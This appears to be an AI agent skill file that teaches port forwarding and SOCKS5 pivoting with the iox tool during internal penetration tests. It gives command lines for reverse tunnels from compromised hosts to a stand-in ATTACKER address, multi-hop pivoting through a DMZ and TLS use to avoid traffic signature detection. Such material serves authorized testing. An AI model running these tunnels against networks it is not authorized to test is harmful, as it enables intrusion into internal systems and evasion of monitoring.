---
name: iox-proxy
description: "Port forwarding and internal network pivoting with iox. Use when an internal port must be forwarded to the outside, when a SOCKS5 tunnel must be established, or when traffic must be relayed. iox is a single-binary, zero-dependency port forwarding/proxy tool supporting forward proxy, reverse proxy, port mapping, and SOCKS5 proxy, and is especially suited to building traffic tunnels during internal penetration testing. Lighter than frp/nps and more capable than socat. Use this skill for scenarios involving port forwarding, internal network pivoting, SOCKS5 proxying, traffic relaying, and tunnel setup"
zh-signals: "使用 iox 进行端口转发与内网穿透，建立 SOCKS5 隧道与流量中转。信号:iox,端口转发,内网穿透,SOCKS5,流量中转"
when-to-use: >-
  Use when forwarding internal ports outward, building SOCKS5 tunnels, or
  pivoting traffic during authorized internal pentests.
metadata:
  tags: "iox,proxy,forward,tunnel,socks5,port forwarding,internal network pivoting,tunnel,proxy,pivot"
  category: "tool"
---

# iox Port Forwarding and Internal Network Pivoting

iox is a lightweight port forwarding/proxy tool — a single binary with zero dependencies, supporting forward/reverse proxy and SOCKS5. During internal penetration testing it is used to build traffic tunnels that let the attacker machine reach services on the target's internal network.

Project URL: https://github.com/EddieIvan01/iox

## Core Concepts

iox has two main modes:
- **fwd** (forward): port forwarding — redirect the traffic of one port to another address
- **proxy**: SOCKS5 proxy — create a proxy so the attacker machine reaches the internal network through the target network

Each mode supports both **forward** connections (the target listens) and **reverse** connections (the target actively connects back to the attacker machine).

## Port Forwarding (fwd)

### Forward Forwarding (target port → target internal network)

Run this on the target machine to redirect external access into the internal network:

```bash
# Forward target port 8888 to internal 10.0.0.2:3389
iox fwd -l 8888 -r 10.0.0.2:3389
# The attacker machine connects to target:8888 to reach 10.0.0.2:3389 (RDP)
```

### Reverse Forwarding (the target connects out)

When the target cannot be reached directly (firewall in the way), let the target connect to the attacker machine:

```bash
# Attacker machine: listen on two ports
iox fwd -l 8888 -l 9999

# Target machine: connect to the attacker machine while connecting to the internal target
iox fwd -r ATTACKER:8888 -r 10.0.0.2:3389

# The attacker machine connects to localhost:9999 to reach internal 10.0.0.2:3389
```

## SOCKS5 Proxy (proxy)

### Forward Proxy

Start SOCKS5 on the target machine so the attacker machine reaches the internal network through the target proxy:

```bash
# Target machine: start the SOCKS5 proxy
iox proxy -l 1080

# Attacker machine: configure proxychains
echo "socks5 TARGET 1080" >> /etc/proxychains.conf
proxychains nmap -sT 10.0.0.0/24
```

### Reverse Proxy (most common — the target cannot receive inbound traffic but can send outbound)

```bash
# Attacker machine: listen and wait for the connection
iox proxy -l 9999

# Target machine: connect back to the attacker machine
iox proxy -r ATTACKER:9999

# The attacker machine uses SOCKS5 through localhost:9999
proxychains nmap -sT 10.0.0.0/24
```

## Encrypted Transport

```bash
# Encrypt with TLS (avoid traffic signature detection)
iox fwd -l 8888 -r 10.0.0.2:3389 -k

# Reverse mode supports it as well
iox proxy -r ATTACKER:9999 -k    # target
iox proxy -l 9999 -k              # attacker machine
```

## Field Scenarios

### Scenario 1: RDP Internal Network Pivoting

```bash
# Shell already obtained on the target, RDP to internal 10.0.0.2 is required
# Attacker machine
iox fwd -l 33890 -l 8888
# Target machine
iox fwd -r ATTACKER:8888 -r 10.0.0.2:3389
# Attacker machine RDP connection
rdesktop localhost:33890
```

### Scenario 2: Multi-hop Internal Network Pivoting

```bash
# First hop: DMZ host already compromised
iox proxy -l 1080                          # Open SOCKS5 on the DMZ
# Second hop: reach the internal host through the DMZ proxy
proxychains iox proxy -l 1081 -r 10.0.0.5  # Connect to the second hop
```

→ ## Decision Tree

→ ```
→ What type of tunnel is needed?
→ ├─ Simple port forwarding (one port mapped to another) → iox fwd
→ ├─ Full SOCKS5 proxy (access an entire internal subnet) → iox proxy
→ ├─ The target has a firewall blocking inbound → reverse mode (-r instead of -l)
→ ├─ Encryption required → add the -k parameter
→ ├─ Persistent tunnel/web management panel required → frp / nps
→ └─ Only one temporary port to relay → socat / ssh -L also works
→ ```
